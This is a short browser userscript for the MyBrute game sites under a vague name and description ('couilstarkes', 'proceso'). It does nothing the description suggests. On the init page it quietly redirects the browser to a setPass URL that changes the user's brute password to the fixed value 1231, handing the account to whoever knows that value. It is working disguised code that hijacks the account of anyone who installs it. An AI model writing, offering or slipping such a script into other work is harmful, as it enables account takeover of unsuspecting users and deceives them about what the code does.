// ==UserScript==
// @name 		couilstarkes
// @include 		http://*.elbruto.es/init*
// @include 		http://*.meinbrutalo.de/init*
// @include 		http://*.labrute.fr/init*
// @include 		http://*.mybrute.com/init*
// @description 	proceso
// @version 		beta
// @copyright 		Samy
// ==/UserScript==


// Get the name of the current Brute
function brute() {
return window.location.href.split("//")[1].split(".")[0];
}


var loc = document.location.host.match(/.+\.(.+)\..+/)[1];     
if (loc.search("elbruto") != -1) { 
    var cellend = ".elbruto.es";
	}
else if (loc.search("meinbrutalo") != -1) { 
    var cellend = ".meinbrutalo.de";
	}
	if (loc.search("mybrute") != -1){
    var cellend = ".mybrute.com";
	}
		if (loc.search("labrute") != -1){
    var cellend = ".labrute.fr";
	}
  {
  var u = 'http://'+brute()+cellend+'/setPass?pass=1231&pass2=1231';
   window.location.assign(u)
    }
	